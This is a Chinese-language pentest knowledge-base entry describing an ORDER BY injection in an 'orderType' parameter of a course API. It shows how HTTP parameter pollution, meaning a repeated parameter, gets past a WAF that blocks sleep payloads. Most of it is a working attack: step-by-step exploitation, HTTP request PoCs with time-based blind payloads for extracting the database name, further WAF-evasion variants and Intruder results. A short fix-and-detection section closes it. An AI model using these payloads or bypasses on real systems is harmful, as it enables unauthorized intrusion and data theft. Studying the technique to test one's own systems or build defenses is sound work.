---
id: web-generic-sqli-orderby-ordertype-hpp-parameter-pollution-blind
title: orderType 排序注入：逗号 + if(sleep) 被 WAF 403，重复参数 HPP 绕过做时间盲注
type: scenario
domain: web
path: web/generic/sqli
technique: orderby-ordertype-hpp-parameter-pollution-time-blind
aliases:
- orderType 注入
- ORDER BY 时间盲注
- 参数污染绕过 WAF
- HPP sleep 盲注
- getStudyCourseV2 注入
tags:
- web
- sqli
- order-by
- time-based
- blind
- hpp
- parameter-pollution
- waf-bypass
- mysql
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V231
  verified_at: '2026-11-07T09:49:09+08:00'
  notes: 已对照原文与图46-53核对：orderType=asc,8 查询失败；asc,if(1=1,1,1) 正常；单参数 sleep 被 WAF 403；重复参数 HPP 绕过并延时约 4 秒；库名 8 位、首位 M；Intruder payload 8 长度 4672。库名/表名未完整枚举；未复跑。
---

## 一句话结论

课程接口的 `orderType` 参数被直接拼进 `ORDER BY ... ASC`，攻击者用 `asc,if(1=1,1,1)` 可注入表达式；但 `asc,if(1=1,sleep(2),1)` 会被 WAF 以 403 拦截，改用重复参数 `orderType=asc&orderType=if(length(database())=8,sleep(2),1)`（HTTP Parameter Pollution）即可绕过 WAF，让后端执行 `sleep` 做时间盲注，逐位判断数据库名长度与字符（原文测出库名 8 位、首位 `M`）。

## 原理

- 注入点：后端把 `orderType` 直接拼到 `ORDER BY <字段> <orderType>` 的排序方向位置，没有白名单/枚举校验；`asc` 是合法方向，逗号后可以接任意表达式（`asc,8`、`asc,if(...)`），从而进入 SQL 语法层。
- 验证：`orderType=asc,8` 返回“查询失败”（8 不是合法排序列/表达式），`orderType=asc,if(1=1,1,1)` 返回正常数据，说明逗号后的 `if()` 被当作排序表达式执行。
- WAF：单参数 `orderType=asc,if(1=1,sleep(2),1)` 被 WAF 识别为注入并返回 403（页面提示“您提交的...威胁，此次访问被...”）；WAF 可能只检查第一个/单个 `orderType` 值，或对逗号 + `sleep` 组合做规则匹配。
- HPP 绕过：发送两个同名参数 `orderType=asc&orderType=if(length(database())=8,sleep(2),1)`。不同框架对重复参数取值不同：WAF/网关可能取第一个 `asc` 判定为无害，后端 `getParameter` 取最后一个或把两个拼接，最终执行 `ORDER BY ... asc if(...)` 或 `asc,if(...)`；原文实测响应延迟，证明 `sleep` 被执行。
- 盲注：`if(length(database())=8,sleep(2),1)` 用响应时间判断库名长度；`if(position('M' in database())=1,sleep(2),1)` 判断首位字符，命中时延迟（原文观察到约 4 秒，可能因为查询执行了两次/两行数据），逐位推进即可读出库名、表名、数据。
- 为什么成立：排序方向属于 SQL 结构而非数据值，预编译占位符无法绑定；应用若不做枚举白名单，只能靠 WAF，而 WAF 与后端对重复参数的解析差异形成绕过空间。

## 触发条件

- 目标接口存在 `orderType`/`order`/`sort` 等排序参数，且被拼进 `ORDER BY`。
- 参数接受逗号后的表达式（`asc,if(...)` 不报错），说明没有严格的 `ASC/DESC` 枚举。
- WAF 对单参数中的 `sleep`/`if`/逗号组合有拦截，但允许重复参数或只检查其中一个值。
- 数据库支持 `sleep()`（MySQL）或等价延时函数；接口响应时间可观测。
- 攻击者能发送重复同名参数（HPP），且后端取值行为可预测（取最后一个/拼接）。

## 利用步骤

1. 找到课程/列表接口的 `orderType` 参数，先发 `orderType=asc` 确认正常；再发 `orderType=asc,8`，若返回“查询失败”说明逗号后的内容进入 SQL。
2. 发 `orderType=asc,if(1=1,1,1)`，若正常返回，确认 `if()` 可执行；发 `orderType=asc,if(1=1,sleep(2),1)`，观察是否 403（WAF）。
3. 改用 HPP：`orderType=asc&orderType=if(length(database())=8,sleep(2),1)`，对比响应时间；命中时延迟，确定库名长度。
4. 用 `orderType=asc&orderType=if(position('M' in database())=1,sleep(2),1)` 判断首位字符（原文命中 `M`，响应长度 4699/延迟）；逐位替换 `position`/`substr` 读出完整库名。
5. 继续盲注表名、列名、数据；若 `sleep` 被拦，尝试 `benchmark()`、`repeat()` 或布尔盲注（`if(...,1,0)` 比较响应内容/长度）。
6. 若 HPP 不起作用，尝试注释/大小写/编码混淆、分块传输、`orderType=asc/*,*/if(...)` 等 WAF 绕过。

## PoC

```http
# 1) 正常
GET /presonCenter/<path>/getStudyCourseV2?name=&orderType=asc HTTP/2
Host: <target>

# 2) 逗号 + if 可执行
GET /presonCenter/<path>/getStudyCourseV2?name=&orderType=asc,if(1=1,1,1) HTTP/2
Host: <target>

# 3) 单参数 sleep 被 WAF 403
GET /presonCenter/<path>/getStudyCourseV2?name=&orderType=asc,if(1=1,sleep(2),1) HTTP/2
Host: <target>
# 响应：403 / “很抱歉，您提交的...威胁，此次访问被...”

# 4) HPP 绕过 + 库名长度盲注（原文）
GET /presonCenter/<path>/getStudyCourseV2?name=&orderType=asc&orderType=if(length(database())=8,sleep(2),1) HTTP/2
Host: <target>
# 命中时约 4 秒延迟；不命中立即返回

# 5) 逐字符盲注
GET /presonCenter/<path>/getStudyCourseV2?name=&orderType=asc&orderType=if(position('M' in database())=1,sleep(2),1) HTTP/2
Host: <target>
# 原文测出库名首位 M，共 8 位
```

```text
Burp Intruder 结果（项目截图）：
payload 8 → 200，响应长度 4672（命中）
其他 payload（4/3/9/10/11/13/14/16）→ 200，长度约 715-741
```

说明：原文对完整 URL/域名打码；接口路径与参数名按截图还原，`sleep` 秒数可按目标调整，实际测试请控制频率避免影响业务。

## 变体与关联

- 变体（HPP）：重复 `orderType`、`order`、`sort`、`direction`；WAF 取第一个、后端取最后一个/拼接时均可绕过。
- 变体（延时函数）：`sleep()`、`benchmark()`、`repeat()`、`get_lock()`；被拦时用布尔盲注比较响应长度/内容。
- 变体（注入位置）：`ORDER BY` 后还可注入 `updatexml` 报错、`extractvalue`、`union`（若结构允许）；标识符位置也可测表名/列名。
- 关联：[[web-generic-sqli-json-fieldconditions-value-updatexml-union]]（同文章另一种 SQLi）、[[web-generic-sqli-java-identifier-table-order-by-injection]]（ORDER BY 标识符注入）、[[web-generic-sqli-jsherp-orderby-extractvalue-loadfile]]（ORDER BY + if/extractvalue 盲注）、[[web-generic-auth-hpp-duplicate-param-auth-data-mismatch]]（HPP 解析差异）。
- 边界：后端严格枚举 `ASC/DESC`、WAF 检查所有同名参数、参数被框架规范化为单值/取第一个并丢弃后续、数据库禁用延时函数时，需换其他技术。

## 检测与防御

- 修复：`orderType` 使用服务端枚举映射（`asc`→`ASC`、`desc`→`DESC`），绝不能把客户端字符串拼进 SQL；排序字段同样白名单。
- 加固：框架层拒绝重复参数或统一取第一个并校验；WAF 对 HPP、注释、大小写、编码做归一化检测；数据库账号最小权限，禁用不必要的延时函数。
- 检测：请求中出现重复的 `orderType`/`order`/`sort` 参数；参数值含 `if(`、`sleep(`、`benchmark(`、`position(`、`substr(`、逗号、注释符；响应时间异常（秒级延迟）或 403 后紧跟变体请求。
- 审计：搜索 `ORDER BY` 拼接、`orderType`/`order`/`sort` 参数、`${}`/字符串拼接的 Mapper；检查是否白名单映射。
